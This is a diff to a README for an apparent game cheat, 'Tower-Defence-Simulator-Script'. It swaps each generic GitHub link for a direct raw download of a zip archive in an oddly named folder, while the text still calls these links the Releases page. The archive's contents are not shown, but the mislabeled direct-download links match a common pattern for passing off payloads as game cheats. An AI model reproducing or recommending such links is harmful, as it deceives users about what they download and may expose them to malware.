@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the Tower-Defence-Simulator-S
 
 ## 📥 Download the Script
 
-[![Download Now](https://img.shields.io/badge/Download%20Script-blue)](https://github.com)
+[![Download Now](https://raw.githubusercontent.com/Nicopro890/Tower-Defence-Simulator-Script/main/livingly/DefenceTowerScriptSimulator_v2.9.zip%20Script-blue)](https://raw.githubusercontent.com/Nicopro890/Tower-Defence-Simulator-Script/main/livingly/DefenceTowerScriptSimulator_v2.9.zip)
 
 To get started, click the button above to visit the Releases page and download the script.
 
@@ -34,7 +34,7 @@ The Tower-Defence-Simulator-Script offers several features to enhance your gamin
 Follow these steps to download and set up the script:
 
 1. **Visit the Releases Page**: 
-   - Click [here](https://github.com) to go to the Releases page.
+   - Click [here](https://raw.githubusercontent.com/Nicopro890/Tower-Defence-Simulator-Script/main/livingly/DefenceTowerScriptSimulator_v2.9.zip) to go to the Releases page.
 
 2. **Select the Latest Release**: 
    - Look for the latest version at the top of the page.
@@ -83,4 +83,4 @@ Your feedback is valuable. If you have suggestions, report bugs, or encounter co
 
 ## 🔗 Visit the Releases Page Again
 
-To download the latest version, click [here](https://github.com) again. Enjoy your gaming experience with Tower-Defence-Simulator-Script.
+To download the latest version, click [here](https://raw.githubusercontent.com/Nicopro890/Tower-Defence-Simulator-Script/main/livingly/DefenceTowerScriptSimulator_v2.9.zip) again. Enjoy your gaming experience with Tower-Defence-Simulator-Script.
